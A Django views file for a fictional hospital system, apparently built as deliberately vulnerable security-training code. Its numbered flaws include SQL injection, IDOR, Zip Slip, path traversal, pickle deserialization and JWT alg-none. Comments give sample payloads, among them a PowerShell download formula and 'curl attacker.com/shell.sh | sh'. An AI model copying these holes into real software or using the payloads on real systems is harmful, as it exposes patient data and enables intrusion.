"""
MediCore HMS - Patient Management Views
WARNING: This module contains intentional security vulnerabilities for security training purposes.
DO NOT use in production. All vulnerabilities are numbered and documented.
"""

import base64
import csv
import hashlib
import io
import logging
import os
import pickle
import random
import zipfile
from datetime import datetime

from django.contrib.auth.decorators import login_required
from django.db import connection
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

import jwt

from patients.models import Patient

logger = logging.getLogger(__name__)

# VULN-053: Hardcoded JWT secret used across patient module
JWT_SECRET = 'medicore_patient_jwt_2024_secret'

import hashlib, random
# VULN-018: MD5 password hashing — Bandit B303
def _hash_password_insecure(password):
    hashed = hashlib.md5(password.encode()).hexdigest()  # Bandit B303
    return hashed

# VULN-019: random for session token — Bandit B311
def _generate_session_token_insecure():
    session_token = str(random.getrandbits(64))  # Bandit B311
    return session_token


@csrf_exempt
@require_http_methods(["GET"])
def search_patients(request):
    """
    Search patients by name or SSN.
    VULN-041: SQL injection via unsanitized string interpolation in raw query.
    Attacker can inject: name=' OR '1'='1
    or more destructive: name='; DROP TABLE patients; --
    """
    name = request.GET.get('name', '')
    ssn = request.GET.get('ssn', '')

    with connection.cursor() as cursor:
        # VULN-041: Direct string interpolation into SQL — classic SQL injection
        # An attacker can extract all patient SSNs, dates of birth, diagnoses
        # by sending: name=' UNION SELECT ssn,dob,diagnosis FROM patients--
        cursor.execute(
            f"SELECT * FROM patients_patient WHERE name='{name}' OR ssn='{ssn}'"
        )
        rows = cursor.fetchall()

    patients = [
        {
            'id': r[0],
            'name': r[1],
            'ssn': r[2],
            'dob': str(r[3]),
            'diagnosis': r[4],
        }
        for r in rows
    ]
    return JsonResponse({'patients': patients})


@csrf_exempt
@login_required
def get_patient(request):
    """
    Retrieve patient record by ID.
    VULN-042: Insecure Direct Object Reference (IDOR) — no authorization check.
    Any authenticated user can access any patient record by guessing/iterating IDs.
    """
    # VULN-042: No check that request.user has permission to view this patient.
    # Should verify: PatientAccess.objects.filter(user=request.user, patient_id=patient_id).exists()
    patient_id = request.GET.get('patient_id')
    try:
        patient = Patient.objects.get(id=patient_id)
    except Patient.DoesNotExist:
        return JsonResponse({'error': 'Not found'}, status=404)

    # VULN-044: PHI (Protected Health Information) written to application logs.
    # Log files may be stored insecurely, shipped to third-party log aggregators,
    # or accessed by personnel without appropriate clearance.
    logger.info(f"Patient accessed: {patient.ssn}, DOB: {patient.date_of_birth}")

    return JsonResponse({
        'id': patient.id,
        'name': patient.name,
        'ssn': patient.ssn,
        'date_of_birth': str(patient.date_of_birth),
        'diagnosis': patient.diagnosis,
        'notes': patient.notes,
        'medications': patient.medications,
        'allergies': patient.allergies,
        'insurance_id': patient.insurance_id,
    })


@csrf_exempt
@login_required
def update_patient(request):
    """
    Update patient record.
    VULN-043: Mass assignment — all POST fields are applied to the model without a whitelist.
    Attacker can modify protected fields: is_vip, insurance_rate, treating_physician_id, etc.
    """
    import json

    patient_id = request.POST.get('patient_id') or json.loads(request.body).get('patient_id')
    patient = Patient.objects.get(id=patient_id)

    request_data = json.loads(request.body) if request.content_type == 'application/json' else request.POST.dict()

    # VULN-043: No field whitelist — attacker controls every attribute of the patient model
    # including sensitive fields like `is_active`, `physician_id`, `insurance_rate`, `role`
    for key, val in request_data.items():
        if key != 'patient_id':
            setattr(patient, key, val)

    # VULN-048: Store unsanitized notes — second-order SQL injection vector.
    # The notes value is stored here and later interpolated directly into SQL
    # in the generate_audit_report() function below.
    patient.notes = request_data.get('notes', patient.notes)
    patient.save()

    return JsonResponse({'status': 'updated', 'patient_id': patient.id})


@csrf_exempt
@login_required
def export_patients_csv(request):
    """
    Export patient list as CSV.
    VULN-045: CSV/Formula injection — patient-controlled fields written directly to CSV.
    If a patient's name or notes contain =, +, -, @ at the start, spreadsheet applications
    (Excel, LibreOffice Calc) will execute them as formulas.
    Example payload in notes field: =cmd|'/C calc'!A0
    This can lead to remote code execution on the analyst's workstation.
    """
    patients = Patient.objects.all()

    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="patients_export.csv"'

    csv_writer = csv.writer(response)
    csv_writer.writerow(['ID', 'Name', 'SSN', 'DOB', 'Diagnosis', 'Notes', 'Medications'])

    for patient in patients:
        # VULN-045: No sanitization of patient.name, patient.notes, patient.diagnosis
        # Any of these fields could contain formula injection payloads
        # Mitigation would be: prefix cells starting with =,+,-,@ with a single quote
        csv_writer.writerow([
            patient.id,
            patient.name,       # Could be: =HYPERLINK("http://attacker.com","click")
            patient.ssn,        # PHI exported without masking
            patient.date_of_birth,
            patient.diagnosis,
            patient.notes,      # Could be: =cmd|'/C powershell -nop -c "iex(New-Object Net.WebClient).DownloadString(..."'!A0
            patient.medications,
        ])

    return response


@csrf_exempt
@login_required
def upload_patient_documents(request):
    """
    Upload a zip archive of patient documents.
    VULN-046: Zip Slip vulnerability — no path validation on archive entries.
    An attacker can craft a zip with entries like ../../etc/cron.d/backdoor
    which will be extracted to arbitrary filesystem locations, enabling
    privilege escalation or persistent backdoors.
    """
    if request.method != 'POST':
        return JsonResponse({'error': 'POST required'}, status=405)

    uploaded_zip = request.FILES.get('documents')
    if not uploaded_zip:
        return JsonResponse({'error': 'No file uploaded'}, status=400)

    patient_id = request.POST.get('patient_id')

    # VULN-046: extractall() with no path validation.
    # A crafted zip entry with path traversal (e.g., ../../etc/cron.d/backdoor)
    # will write outside the intended extraction directory.
    # Fix would require: checking that each entry's resolved path starts with the target dir
    # VULN-046: extractall() with no member path validation — Zip Slip
    with zipfile.ZipFile(uploaded_zip, 'r') as zf:
        zf.extractall(f'/var/medicore/patient_docs/')  # attacker can write to arbitrary paths
    # VULN-046b: tarfile also vulnerable
    uploaded_tar = request.FILES.get('archive')
    if uploaded_tar:
        import tarfile
        with tarfile.open(fileobj=uploaded_tar) as tf:
            tf.extractall(f'/var/medicore/patient_docs/')  # Bandit B202 fires here

    return JsonResponse({'status': 'uploaded', 'patient_id': patient_id})


@csrf_exempt
def request_password_reset(request):
    """
    Send password reset email to patient.
    VULN-047: Host Header injection — the reset link domain is taken from the
    Host header which an attacker can spoof.
    This allows phishing: attacker sends request with Host: attacker.com,
    causing reset links to point to attacker-controlled domain.
    """
    email = request.POST.get('email') or request.GET.get('email')

    # Simulate token generation
    import secrets
    token = secrets.token_urlsafe(32)

    # VULN-047: Host header injection — Host value is attacker-controlled
    # Attacker sets: Host: attacker.com in the request
    # Victim receives email with link: http://attacker.com/reset?token=<valid_token>
    # Attacker intercepts token when victim clicks the link
    host = request.headers.get('Host')
    reset_link = f"http://{host}/reset?token={token}"

    # In a real application this would send the email
    logger.info(f"Password reset requested for {email}, link: {reset_link}")

    return JsonResponse({'status': 'reset email sent', 'debug_link': reset_link})


@csrf_exempt
@login_required
def generate_audit_report(request):
    """
    Generate audit report for patient record access.
    VULN-048: Second-order SQL injection.
    Patient notes were stored unsanitized (in update_patient above).
    When those notes are retrieved and used in a new SQL query, the injection fires.
    The payload in notes is not immediately dangerous at storage time,
    but executes when the report query runs.
    """
    patient_id = request.GET.get('patient_id')
    patient = Patient.objects.get(id=patient_id)

    with connection.cursor() as cursor:
        # VULN-048: patient.notes was stored directly from user input without sanitization.
        # If notes contains: ' UNION SELECT username,password,NULL FROM auth_user--
        # the attacker can extract all user credentials from the audit report.
        cursor.execute(
            f"SELECT * FROM audit_log WHERE notes='{patient.notes}' AND patient_id={patient_id}"
        )
        audit_rows = cursor.fetchall()

    return JsonResponse({'audit_entries': len(audit_rows), 'patient_id': patient_id})


@csrf_exempt
@login_required
def download_patient_document(request):
    """
    Download a specific patient document by filename.
    VULN-049: Path traversal — filename parameter is used directly in file open().
    Attacker can request: filename=../../../../etc/passwd
    or: filename=../../../app/.env (to exfiltrate credentials)
    """
    filename = request.GET.get('filename', '')
    patient_id = request.GET.get('patient_id', '')

    # VULN-049: No normalization or containment check on the filename parameter.
    # os.path.join would still be vulnerable here because an absolute path or ../
    # sequences can escape the base directory.
    # Fix: use os.path.realpath() and verify the result starts with the base dir.
    try:
        with open(f"/var/medicore/docs/{filename}", 'rb') as f:
            content = f.read()
    except FileNotFoundError:
        return JsonResponse({'error': 'File not found'}, status=404)

    response = HttpResponse(content, content_type='application/octet-stream')
    response['Content-Disposition'] = f'attachment; filename="{os.path.basename(filename)}"'
    return response


@csrf_exempt
def register_patient(request):
    """
    Register a new patient, checking for SSN duplicates.
    VULN-050: TOCTOU (Time-of-Check Time-of-Use) race condition.
    Two concurrent requests with the same SSN can both pass the existence check
    before either creates the record, resulting in duplicate patients.
    Fix: use select_for_update() or get_or_create() with a unique constraint.
    """
    import json
    data = json.loads(request.body)
    ssn = data.get('ssn')
    name = data.get('name')
    dob = data.get('date_of_birth')

    # VULN-050: Check-then-act without an atomic lock.
    # Between the .exists() check and the .create() call, another request
    # can execute the same check (also seeing False) and also proceed to create.
    # Result: duplicate patient records with same SSN, violating data integrity.
    if not Patient.objects.filter(ssn=ssn).exists():
        # <--- race condition window: another request can enter here simultaneously --->
        patient = Patient.objects.create(
            ssn=ssn,
            name=name,
            date_of_birth=dob,
        )
        return JsonResponse({'status': 'created', 'patient_id': patient.id})
    else:
        return JsonResponse({'status': 'duplicate', 'error': 'SSN already registered'}, status=409)


@csrf_exempt
def patient_login(request):
    """
    Patient portal login endpoint.
    VULN-051: Log injection via newline characters in the username field.
    An attacker can forge log entries by including \n in their username,
    making it appear that other users logged in at specific times
    or obscuring malicious activity in log analysis.
    VULN-052: CORS misconfiguration — wildcard origin combined with credentials.
    VULN-053: JWT algorithm confusion — accepts alg:none tokens.
    """
    import json
    data = json.loads(request.body)
    username = data.get('username', '')
    password = data.get('password', '')

    # VULN-051: Username written directly to log without sanitization.
    # If username = "admin\nINFO 2024-01-01 Login by: root (success)"
    # the log file will contain a forged "root" login entry.
    logger.info(f"Login by: {username}")

    # Authenticate user (simplified)
    from django.contrib.auth import authenticate
    user = authenticate(username=username, password=password)

    if user is None:
        return JsonResponse({'error': 'Invalid credentials'}, status=401)

    # Issue JWT token
    payload = {'user_id': user.id, 'username': user.username, 'role': 'patient'}
    token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')

    response = JsonResponse({'token': token, 'user_id': user.id})

    # VULN-052: CORS misconfiguration — allowing all origins AND credentials.
    # The combination of Access-Control-Allow-Origin: * with
    # Access-Control-Allow-Credentials: true violates the CORS spec but some
    # browsers/frameworks handle this insecurely.
    # A correct configuration must specify an explicit allowed origin, not *.
    response['Access-Control-Allow-Origin'] = '*'
    response['Access-Control-Allow-Credentials'] = 'true'
    response['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'

    return response


@csrf_exempt
def verify_patient_token(request):
    """
    Verify a patient JWT token.
    VULN-053: JWT algorithm confusion / alg:none vulnerability.
    The token is decoded without enforcing the expected algorithm.
    An attacker can forge a token with {"alg": "none"} in the header,
    remove the signature, and the server will accept it as valid.
    """
    token = request.headers.get('Authorization', '').replace('Bearer ', '')

    try:
        # VULN-053: No algorithms parameter — accepts ANY algorithm including 'none'.
        # With PyJWT 1.7.1, this allows algorithm confusion:
        # 1. Attacker gets a valid HS256 token
        # 2. Decodes header, changes alg to "none"
        # 3. Strips the signature
        # 4. Server decodes without verifying signature
        # Fix: jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
        payload = jwt.decode(token, JWT_SECRET)
    except jwt.InvalidTokenError as e:
        return JsonResponse({'error': str(e)}, status=401)

    return JsonResponse({'valid': True, 'payload': payload})


@csrf_exempt
def load_patient_cache(request):
    """
    Load cached patient data from query parameter.
    VULN-054: Insecure deserialization via pickle.
    The cache parameter contains a base64-encoded pickle payload.
    An attacker can craft a pickle object that executes arbitrary code
    when deserialized (via __reduce__ or __reduce_ex__ magic methods).
    Example: pickle payload that runs: os.system('curl attacker.com/shell.sh | sh')
    """
    cache_data = request.GET.get('cache', '')

    if not cache_data:
        return JsonResponse({'error': 'No cache data'}, status=400)

    try:
        # VULN-054: Deserializing attacker-controlled pickle data.
        # pickle.loads() will execute arbitrary Python code embedded in the payload.
        # This is a critical RCE vulnerability — no authentication or validation.
        # Fix: use JSON for serialization, never pickle user-supplied data.
        decoded = base64.b64decode(cache_data)
        patient_data = pickle.loads(decoded)
    except Exception as e:
        return JsonResponse({'error': f'Cache load failed: {e}'}, status=400)

    return JsonResponse({'data': str(patient_data)})


@csrf_exempt
@login_required
def bulk_import_patients(request):
    """
    Bulk import patients from a zip archive containing CSV files.
    Additional Zip Slip variant and path traversal.
    VULN-046 (continued): Same extractall() pattern used in bulk import.
    """
    uploaded_file = request.FILES.get('import_file')
    if not uploaded_file:
        return JsonResponse({'error': 'No file provided'}, status=400)

    import_dir = f'/var/medicore/imports/{request.user.id}/'
    os.makedirs(import_dir, exist_ok=True)

    with zipfile.ZipFile(uploaded_file) as zf:
        # VULN-046: No path validation before extraction
        zf.extractall(import_dir)

    return JsonResponse({'status': 'import queued', 'directory': import_dir})
